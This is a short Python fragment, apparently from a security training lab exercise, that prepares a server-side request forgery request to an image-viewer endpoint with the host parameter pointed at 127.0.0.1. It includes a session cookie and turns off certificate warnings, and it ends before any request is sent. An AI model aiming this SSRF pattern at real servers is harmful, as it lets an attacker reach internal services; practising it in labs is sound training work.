import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 인증서 없을 때 오류 안보이게 함

url = "https://lab.eqst.co.kr:8099/ssrf_2/imageview.php?host=127.0.0.1"
h = {"Host":"lab.eqst.co.kr:8099",
     "Content-Type": "application/x-www-form-urlencoded"}
c = {"PHPSESSID":"905304195bf47b2df4c5264a0e41068a"}